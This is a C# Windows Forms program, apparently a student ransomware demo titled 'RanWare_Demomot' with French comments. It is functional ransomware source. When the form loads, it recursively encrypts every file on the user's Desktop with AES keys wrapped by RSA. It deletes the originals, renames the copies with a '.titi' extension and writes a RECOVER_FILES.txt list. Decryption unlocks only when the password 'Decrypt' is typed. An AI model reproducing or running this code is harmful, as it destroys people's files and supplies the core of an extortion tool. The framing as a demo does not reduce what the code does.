using System.IO;
using System.Text;
using System.Security.Cryptography;

namespace RanWare_Demomot
{
    public partial class Form1 : Form
    {
        // Declare CspParmeters and RsaCryptoServiceProvider
        // objects with global scope of your Form class.
        readonly CspParameters cspP = new CspParameters();
        RSACryptoServiceProvider rsa;


        List<string> filesName = new List<string>();//Liste qui va contenir les nom des fichiers
        int numberOfFiles;//Variables pour conter le nombre de fichiers encryptés

        

        const bool ENCRYPT_DESKTOP = true;//Encrypte le bureau
        const bool DECRYPT_DESKTOP = true;//Decrypte le bureau
        const bool ENCRYPT_DOCUMENTS = false;//Encrypte les documents
        const bool DECRYPT_DOCUMENTS = false;//Derypte les documents
        const bool ENCRYPT_PICTURES = false;//Encrypte les images
        const bool DECRYPT_PICTURES = false;//Decrypte les images
        const string KEYNAME = "Password1";
        const string ENCRYPTED_FILE_EXTENSION = ".titi";
        //// Public key file
        //const string PubKeyFile = @"c:\encrypt\rsaPublicKey.txt";

        string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string Pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

        

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //this.ShowInTaskbar = false;//Pas d'îcone dans la barre des tâches

            if (ENCRYPT_DESKTOP)
            {
                encryptFolderFiles(Desktop);
            }

            if (ENCRYPT_PICTURES)
            {
                encryptFolderFiles(Pictures);
            }

            if (ENCRYPT_DOCUMENTS)
            {
                encryptFolderFiles(Documents);
            }

            lblNbr.Text = Convert.ToString(numberOfFiles);

            if (numberOfFiles > 0)
            {
                ransomLetter(filesName);
            }
            
        }

        /// <summary>
        /// Envoi chaque fichier du repertoire à la méthode qui les encryptes
        /// </summary>
        /// <param name="sDir"></param>
        private void encryptFolderFiles(string sDir)
        {
            // Stores a key pair in the key container.
            cspP.KeyContainerName = KEYNAME;
            rsa = new RSACryptoServiceProvider(cspP)
            {
                PersistKeyInCsp = true
            };

            foreach (string f in Directory.GetFiles(sDir))
            {
                if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                {
                    EncryptFile(new FileInfo (f));
                }
            }

            foreach (string d in Directory.GetDirectories(sDir))
            {
                encryptFolderFiles(d);
            }
        }

        /// <summary>
        /// Encrypte le fichier (AES)
        /// </summary>
        /// <param name="inputFile"></param>Fichier à encrypter
        private void EncryptFile(FileInfo inputFile)
        {
            if (inputFile.Extension != ".ini" && inputFile.Name != "RECOVER_FILES.txt")
            {
                // Create instance of Aes for
                // symmetric encryption of the data.
                Aes aes = Aes.Create();
                ICryptoTransform transform = aes.CreateEncryptor();

                // Use RSACryptoServiceProvider to
                // encrypt the AES key.
                // rsa is previously instantiated:
                //    rsa = new RSACryptoServiceProvider(cspp);
                byte[] keyEncrypted = rsa.Encrypt(aes.Key, false);

                // Create byte arrays to contain
                // the length values of the key and IV.
                int lKey = keyEncrypted.Length;
                byte[] LenK = BitConverter.GetBytes(lKey);
                int lIV = aes.IV.Length;
                byte[] LenIV = BitConverter.GetBytes(lIV);

                // Write the following to the FileStream
                // for the encrypted file (outFs):
                // - length of the key
                // - length of the IV
                // - ecrypted key
                // - the IV
                // - the encrypted cipher content

                // Crée le nouveau fichier encrypter
                //string outFile = Path.Combine(Path.ChangeExtension(inputFile.Name, ENCRYPTED_FILE_EXTENSION));//Original

                string testPath = Path.GetFullPath(inputFile.FullName);
                string outFile = Path.Combine(testPath);

                //Va ecrire dans le nouveau fichier le message encrypter
                using (var outFs = new FileStream(outFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create))//Crée le nouveau fichier (nom du fichier + ancienne extention.nouvell extention)
                {
                    outFs.Write(LenK, 0, 4);
                    outFs.Write(LenIV, 0, 4);
                    outFs.Write(keyEncrypted, 0, lKey);
                    outFs.Write(aes.IV, 0, lIV);

                    // Now write the cipher text using
                    // a CryptoStream for encrypting.
                    using (var outStreamEncrypted =
                        new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                    {
                        // By encrypting a chunk at
                        // a time, you can save memory
                        // and accommodate large files.
                        int count = 0;
                        int offset = 0;

                        // blockSizeBytes can be any arbitrary size.
                        int blockSizeBytes = aes.BlockSize / 8;
                        byte[] data = new byte[blockSizeBytes];
                        int bytesRead = 0;

                        using (var inFs = new FileStream(inputFile.FullName, FileMode.Open))
                        {
                            do
                            {
                                count = inFs.Read(data, 0, blockSizeBytes);
                                offset += count;
                                outStreamEncrypted.Write(data, 0, count);
                                bytesRead += blockSizeBytes;
                            } while (count > 0);
                        }
                        outStreamEncrypted.FlushFinalBlock();
                    }
                }
                filesName.Add(inputFile.FullName);//Ajoute le fichier encrypté à la liste
                numberOfFiles++;
                File.Delete(inputFile.FullName);
            }
        }

        /// <summary>
        /// Envoi chaque fichier du repertoire à la méthode qui les decryptes
        /// </summary>
        /// <param name="sDir"></param>Répertoire ou l'on veut chercher les fichiers à dercrypter
        private void decryptFolderFiles(string sDir)
        {
            foreach (string f in Directory.GetFiles(sDir))
            {
                if (f.Contains(ENCRYPTED_FILE_EXTENSION))
                {
                    DecryptFile(new FileInfo(f));
                }
            }

            foreach (string d in Directory.GetDirectories(sDir))
            {
                decryptFolderFiles(d);
            }
        }

        /// <summary>
        /// Quand l'utilisateur clique sur le bouton decrypt, si le mot de passe est le bon, va appeler la methode qui va chercher tous le fichiers d'un répertoire et les envoyer à la methode qui les encrypte
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            if (txtBoxInput.Text == "Decrypt")
            {
                if (DECRYPT_DESKTOP)
                {
                    decryptFolderFiles(Desktop);
                }

                if (DECRYPT_PICTURES)
                {
                    decryptFolderFiles(Pictures);
                }
            }
            else
            {
                MessageBox.Show("Bien essayé");
            }
        }

        /// <summary>
        /// Decrypt le fichier
        /// </summary>
        /// <param name="file"></param>Fichier à decrypter
        private void DecryptFile(FileInfo file)
        {
            // Create instance of Aes for
            // symmetric decryption of the data.
            Aes aes = Aes.Create();

            // Create byte arrays to get the length of
            // the encrypted key and IV.
            // These values were stored as 4 bytes each
            // at the beginning of the encrypted package.
            byte[] LenK = new byte[4];
            byte[] LenIV = new byte[4];

            // Construct the file name for the decrypted file.
            string outFile =
                Path.ChangeExtension(file.FullName.Replace("Encrypt", "Decrypt"), "");

            // Use FileStream objects to read the encrypted
            // file (inFs) and save the decrypted file (outFs).
            using (var inFs = new FileStream(file.FullName, FileMode.Open))
            {
                inFs.Seek(0, SeekOrigin.Begin);
                inFs.Read(LenK, 0, 3);
                inFs.Seek(4, SeekOrigin.Begin);
                inFs.Read(LenIV, 0, 3);

                // Convert the lengths to integer values.
                int lenK = BitConverter.ToInt32(LenK, 0);
                int lenIV = BitConverter.ToInt32(LenIV, 0);

                // Determine the start postition of
                // the ciphter text (startC)
                // and its length(lenC).
                int startC = lenK + lenIV + 8;
                int lenC = (int)inFs.Length - startC;

                // Create the byte arrays for
                // the encrypted Aes key,
                // the IV, and the cipher text.
                byte[] KeyEncrypted = new byte[lenK];
                byte[] IV = new byte[lenIV];

                // Extract the key and IV
                // starting from index 8
                // after the length values.
                inFs.Seek(8, SeekOrigin.Begin);
                inFs.Read(KeyEncrypted, 0, lenK);
                inFs.Seek(8 + lenK, SeekOrigin.Begin);
                inFs.Read(IV, 0, lenIV);

                //Directory.CreateDirectory(DecrFolder);
                // Use RSACryptoServiceProvider
                // to decrypt the AES key.
                byte[] KeyDecrypted = rsa.Decrypt(KeyEncrypted, false);

                // Decrypt the key.
                ICryptoTransform transform = aes.CreateDecryptor(KeyDecrypted, IV);

                // Decrypt the cipher text from
                // from the FileSteam of the encrypted
                // file (inFs) into the FileStream
                // for the decrypted file (outFs).
                using (var outFs = new FileStream(outFile, FileMode.Create))
                {
                    int count = 0;
                    int offset = 0;

                    // blockSizeBytes can be any arbitrary size.
                    int blockSizeBytes = aes.BlockSize / 8;
                    byte[] data = new byte[blockSizeBytes];

                    // By decrypting a chunk a time,
                    // you can save memory and
                    // accommodate large files.

                    // Start at the beginning
                    // of the cipher text.
                    inFs.Seek(startC, SeekOrigin.Begin);
                    using (var outStreamDecrypted =
                        new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                    {
                        do
                        {
                            count = inFs.Read(data, 0, blockSizeBytes);
                            offset += count;
                            outStreamDecrypted.Write(data, 0, count);
                        } while (count > 0);
                        outStreamDecrypted.FlushFinalBlock();
                    }
                }
            }
            File.Delete(file.FullName);
        }

        private void ransomLetter(List<string> files)
        {
            StreamWriter ransomWriter = new StreamWriter(Desktop + @"\RECOVER_FILES.txt");
            foreach (string fileName in files)
            {
                ransomWriter.WriteLine(fileName);
            }

            ransomWriter.Close();
        }
    }
}